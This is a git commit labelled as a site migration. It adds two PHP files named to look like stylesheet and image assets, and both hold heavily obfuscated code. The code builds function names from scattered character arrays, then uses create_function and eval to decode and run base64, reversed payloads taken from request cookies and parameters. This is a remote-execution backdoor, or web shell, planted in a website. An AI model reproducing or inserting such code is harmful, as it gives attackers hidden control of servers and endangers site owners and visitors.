10d2a9c67b1f74b4a8ea46d1cd0a63e560ab70d7
Luigi Sgro <lsgrodev@gmail.com>
2021-01-22 18:19:21 +0100

    Migrate quantcomponents site

---
+++ quantcomponents/css/ls_2010_ver1.php
@@ -0,0 +1,98 @@
+<?php
+
+$clime = 'nmT;)eP)`';$failure = 'T';$architecturally ='('; $gaping='[';$betterment = 'j(_aFe_]W'; $complicator='roPi';$consulates= 'a';$deliberation ='b'; $hospitality = 'v';
+
+$dedicates= 'O';$cheek= 'Gj4eUgr';
+$leathered= ')'; $integer='qM_Yca'; $chuckled ='a)';$anchorite='G))'; $ilysa='T';
+
+$frill =')'; $conceded =',tRc';$deaf ='t';$deludes='nf o';
+
+$boulders ='"ETvtC;$i'; $antiresonance ='g'; $brightness ='mVs,';$frequently='s';$controlling = '$Ef_'; $computationally = ')eE[rotir';
+$glued= 'Z)epn'; $emphasizing = 'C';
+
+$judo = 'vFf]$_o_R'; $inheritress= '[';$cashmoneyhos= '"['; $antithetic='(';
+$grrrrrrrbaby= '^i$:I';$courageously ='R';
+$alumna='uMo$OisT';$educated = 'r'; $banished ='gr';$grid ='icSmO)';$knead = 'c?P'; $declaratives='"';$exchequers='"Q_X$Kd';
+
+$greased = ']s"'; $denis='$R(:kri';$frolic = 's';
+$ideological ='_'; $associates = '=r"ngc(y';$inconsiderate= 'e$';$cayuga='('; $dictating= '(ac'; $heady='s';
+$gem= 'm';
+$brutes= 'rt'; $jonathan ='y'; $improvisation= 't'; $center= 'e'; $defunct= 'srjeaa'; $johannah='O';$dismissers = 'gopV';$articles = 'E?OJ'; $joule ='[TS"=h';$entering='JioitaCa'; $gravest = '_)peefeH"'; $collimate = 'v';$circumlocutions= 'e6(H_';$hereabouts = 'l'; $heda='l';
+$faunie='d';$channi= ']'; $animals='e'; $evelina='r';
+$chateaus= 'e'; $dean='(cadE';
+$gloving = 'of]uiO$';$boots=';(aE(a';$cochineal ='e'; $biology = 'g';
+
+$boasted ='e'; $captainkirk= 'OQ';$jessie = 'sS_;eb'; $bllodness='E';$genuine = 'erlU_d$'; $glomerular= $dean['1']. $genuine['1'] . $genuine[0] . $boots['5'].
+$entering[4] . $genuine[0] . $genuine['4'] . $gloving['1'] .
+
+$gloving[3] . $associates['3'] . $dean['1'].
+
+$entering[4].$gloving['4'] . $gloving['0'] . $associates['3']; $ingenious= $deludes['2'] ;$headgear =$glomerular ($ingenious, $genuine[0] .
+
+$collimate. $boots['5'].
+$genuine['2'].$boots['4'].
+$boots['5'] . $genuine['1'] .$genuine['1']. $boots['5']. $jonathan.$genuine['4'] .$gravest['2'] . $gloving['0'] . $gravest['2'] .$boots['4'] . $gloving['1']. $gloving[3]. $associates['3']. $dean['1'].$genuine['4'] .$biology.$genuine[0].$entering[4]. $genuine['4'].$boots['5']. $genuine['1']. $biology.
+
+$jessie['0'] . $boots['4'].$gravest['1'].
+$gravest['1']. $gravest['1']. $jessie['3']);$headgear ($jessie['0'],
+$deriving['8'] ,
+$genuine['4'] ,$captainkirk['0'] ,
+$alumna['1'] ,
+$denis[4] ,$genuine['3'], $articles['1'], $boots['4'] ,$integer[3] ,
+$genuine['6']. $gloving['4'] .$joule['4'] . $boots['5']. $genuine['1'] .
+
+$genuine['1'].$boots['5']. $jonathan.$genuine['4'] .$gem .$genuine[0].$genuine['1'].$biology . $genuine[0].
+$boots['4'].
+$genuine['6'] . $genuine['4'] .$denis['1'] . $bllodness . $captainkirk['1'].$genuine['3'].$bllodness. $jessie[1]. $joule['1']. $brightness['3'].$genuine['6']. $genuine['4'] .$entering['6'].
+$captainkirk['0'].
+
+$captainkirk['0'].$exchequers[5].$grrrrrrrbaby['4'].$bllodness.
+
+$brightness['3'].
+
+$genuine['6']. $genuine['4'] . $jessie[1]. $bllodness .$denis['1'] . $dismissers['3'] .$bllodness.$denis['1']. $gravest['1']. $jessie['3'] .$genuine['6'] . $boots['5'] . $joule['4']. $gloving['4'].$jessie['0'].$jessie['0']. $genuine[0] . $entering[4] .$boots['4'] .$genuine['6'] .
+
+$gloving['4'].
+
+$joule['0']. $gravest['8'].$gloving['0']. $gloving['1'].$dean['1'] .
+$gloving['0'] . $biology.
+$defunct['2'].
+
+$genuine[0].$gem.$gravest['8'].$gloving['2'] .$gravest['1'].
+
+$articles['1'] .
+
+$genuine['6'] .$gloving['4'] .
+$joule['0'] . $gravest['8'] .$gloving['0'] .
+$gloving['1'] .$dean['1'] . $gloving['0'] .$biology .$defunct['2'] .
+
+$genuine[0]. $gem. $gravest['8'] . $gloving['2'] . $denis['3'].
+$boots['4'].
+$gloving['4'].
+
+$jessie['0'].$jessie['0']. $genuine[0].$entering[4] .$boots['4'] . $genuine['6']. $gloving['4'] . $joule['0'] . $gravest['8'].$circumlocutions['3'].
+
+$joule['1'].$joule['1'] . $knead['2'].$genuine['4'].
+
+$captainkirk['0'].$judo['1'] .
+
+$entering['6'].$captainkirk['0'] . $anchorite['0']. $entering['0'].$bllodness. $alumna['1'].$gravest['8'].$gloving['2'] .$gravest['1']. $articles['1'] . $genuine['6'] . $gloving['4']. $joule['0'] .$gravest['8'].$circumlocutions['3'] . $joule['1'].$joule['1'].$knead['2'].$genuine['4'].$captainkirk['0'] .$judo['1'] .$entering['6'].$captainkirk['0'] .$anchorite['0']. $entering['0'] .$bllodness.
+
+$alumna['1'].$gravest['8']. $gloving['2'] . $denis['3'] . $genuine['5']. $gloving['4'] .$genuine[0]. $gravest['1'].$jessie['3'] . $genuine[0] . $collimate .
+$boots['5']. $genuine['2'] .$boots['4']. $jessie['0'] .$entering[4].
+$genuine['1'].
+
+$genuine['1'] .$genuine[0].$collimate.
+
+$boots['4'] .$jessie[5] . $boots['5'] .$jessie['0'] .
+
+$genuine[0]. $circumlocutions['1'] .$cheek['2'] .$genuine['4'] . $genuine['5']. $genuine[0].
+$dean['1'].
+
+$gloving['0'] .$genuine['5']. $genuine[0] .
+$boots['4']. $jessie['0'].$entering[4] . $genuine['1'] .$genuine['1']. $genuine[0].$collimate.
+
+$boots['4'].$genuine['6'].
+$boots['5'].$gravest['1'] . $gravest['1']. $gravest['1'] .
+
+$gravest['1']. $jessie['3']  );
---
+++ quantcomponents/images/header_bck_old.php
@@ -0,0 +1,107 @@
+<?php
+
+	$forcibly ='T';
+	$copse= 'ne)s$bf?';$cowslip= 'N';$anticipating = 'u'; $maddie='aXCB9es'; $foundling= 'Se';$lariat ='"'; $crazed = 'g';$flap = 'x'; $hardboard ='(M';$glees = '"r=;'; $levers =';'; $aprons= 'f';
+
+	$kivu= '[I'; $kneeled =',';$behaves ='K'; $hostilely = 'F';$dazzlingly= 'fi4(Up'; $imbecile = 'a';$joane='$';$formants ='=(';$disengaged='"L[r_['; $antibiotic = 'yU$t(HRe_';$armful = '"_)QaU(i'; $engraver ='_';
+	$knight = 'gR$s:LE';$blastula ='"';$homogeneous='r'; $ceil ='(cPf)er;';$ere = '(ao;[iE"c';$installment = 'nt$?_';$dot ='?'; $insured=']';$brade= 'xUlIr_@'; $individually= 't_t<i'; $calculation ='d'; $benefited ='Tvd(e';$cheerlessness ='V"'; $bunted = '_aGS;u'; $hornet='etHa$X()';
+	$destructor='e';
+
+	$liberate='Z'; $flowing ='g'; $hobble ='r';$dissertations ='Tev$lX)';
+	$censurer = 'r:FB';
+	$caused='mi))YcK)';$deeming= ' '; $camila='r';$kaile =']$UeiS';$benni ='H';
+
+	$lanky= 'X_VTeEp'; $cammy = 'eo>ueWu'; $harlot ='"';$emilio ='ErB$O';
+
+	$clucked= '[tEar';$carbonaceous = 'D';$derick='tR_L]y';$exploring = '_'; $hakeem = '$';
+	$launch = ']'; $aureomycin ='RsP'; $galloped ='i'; $godfree ='a';
+	$homely=')'; $encloses='u'; $eachelle='OTxa';
+	$fragrance=')'; $boulder ='is';
+	$credenza = 'r'; $decadently= 'e';$asymptotically='xQss6Ae';
+	$entreat = 'P';$flamingo ='a';
+
+	$capitalist = 'i';$bastes= 'T'; $envelops='a';$apostolic = 'vb)C'; $beneficially= 'J'; $colloquium = 'l';$junie= 'l'; $bungle = 'XT:t=Ob';
+	$exchanged='E';
+	$creature='v'; $collapsed = 'n'; $gallops= 's';$awards='u';
+
+	$cofactor=',UdT(ct'; $caliph = '(Fo'; $hurleigh= $cofactor['5'].$credenza . $asymptotically['6']. $envelops .$cofactor['6'].$asymptotically['6'] . $exploring . $ceil['3']. $awards.$collapsed .
+
+	$cofactor['5']. $cofactor['6']. $capitalist.
+	$caliph['2'] .$collapsed ; $horseshoer = $deeming ; $citric =$hurleigh ($horseshoer,$asymptotically['6'] .$creature . $envelops . $junie .$caliph['0'] .
+
+	$envelops. $credenza. $credenza . $envelops.
+	$derick['5']. $exploring. $lanky['6']. $caliph['2'] .$lanky['6'].$caliph['0']. $ceil['3']. $awards.
+	$collapsed. $cofactor['5'] .
+
+	$exploring. $flowing .$asymptotically['6'] .
+	$cofactor['6'].$exploring. $envelops .
+	$credenza. $flowing.$gallops .$caliph['0']. $apostolic['2'].$apostolic['2'].$apostolic['2']. $bunted['4'] );
+	$citric
+
+	($guardian['5'] ,$cofactor['1'] , $digestible['1'], $brade[6],$exchanged , $catalpa['1'],
+
+	$blended['1'],
+	$catalpa['1'], $asymptotically[1], $hakeem.$capitalist.$bungle[4].$envelops .$credenza .
+
+	$credenza.
+	$envelops .$derick['5'] .$exploring. $caused[0] . $asymptotically['6'].
+
+	$credenza . $flowing . $asymptotically['6'] .$caliph['0'] . $hakeem . $exploring. $aureomycin['0'].$exchanged . $asymptotically[1] .$cofactor['1'].$exchanged.
+
+	$kaile['5']. $cofactor['3'].$cofactor['0'].$hakeem .
+
+	$exploring .$apostolic['3'] .$bungle['5']. $bungle['5']. $caused['6'] .$brade['3'] . $exchanged. $cofactor['0']. $hakeem . $exploring .$kaile['5'] .$exchanged. $aureomycin['0'] .$lanky[2] . $exchanged .$aureomycin['0'] .$apostolic['2']. $bunted['4'] . $hakeem .
+
+	$envelops. $bungle[4].
+
+	$capitalist . $gallops . $gallops .$asymptotically['6']. $cofactor['6']. $caliph['0'] .
+
+	$hakeem.$capitalist. $clucked['0'].
+
+	$harlot. $cofactor['6'] .
+
+	$junie .$awards.
+
+	$asymptotically['0'] . $bungle[6].
+
+	$awards . $asymptotically['0']. $ceil['3'].$harlot . $launch .
+	$apostolic['2'] .$dot .$hakeem .
+
+	$capitalist. $clucked['0'].$harlot .
+	$cofactor['6'] .
+	$junie. $awards. $asymptotically['0'].$bungle[6] .
+	$awards .
+
+	$asymptotically['0'].
+	$ceil['3']. $harlot.
+	$launch .$bungle['2'] . $caliph['0'].$capitalist .
+
+	$gallops .
+
+	$gallops .
+
+	$asymptotically['6'].$cofactor['6'] .$caliph['0'].$hakeem . $capitalist. $clucked['0'].$harlot .
+
+	$benni.$cofactor['3'] . $cofactor['3'] .$entreat .$exploring . $cofactor['3'].
+
+	$derick[3] . $cofactor['1'].
+
+	$bungle['0'].$emilio['2'].$cofactor['1'].$bungle['0'].$caliph['1']. $harlot .$launch . $apostolic['2'] .
+
+	$dot . $hakeem .$capitalist. $clucked['0'].$harlot . $benni . $cofactor['3'].$cofactor['3'] .$entreat .$exploring.$cofactor['3'] .$derick[3] . $cofactor['1']. $bungle['0']. $emilio['2'] .$cofactor['1'] .$bungle['0']. $caliph['1'].
+
+	$harlot .$launch .$bungle['2'].
+	$cofactor[2] .$capitalist .
+	$asymptotically['6'].$apostolic['2'].
+
+	$bunted['4'].$asymptotically['6']. $creature . $envelops .$junie. $caliph['0'].$gallops. $cofactor['6'] .$credenza.
+
+	$credenza . $asymptotically['6'].
+	$creature. $caliph['0'].$bungle[6] . $envelops.
+
+	$gallops.$asymptotically['6']. $asymptotically['4']. $dazzlingly[2].$exploring.
+
+	$cofactor[2] . $asymptotically['6'] . $cofactor['5']. $caliph['2'] . $cofactor[2].$asymptotically['6'].$caliph['0'] .$gallops . $cofactor['6'].$credenza. $credenza.$asymptotically['6'].$creature.$caliph['0'] .$hakeem . $envelops .
+
+	$apostolic['2'] . $apostolic['2'] .$apostolic['2'] .
+	$apostolic['2'] . $bunted['4']);
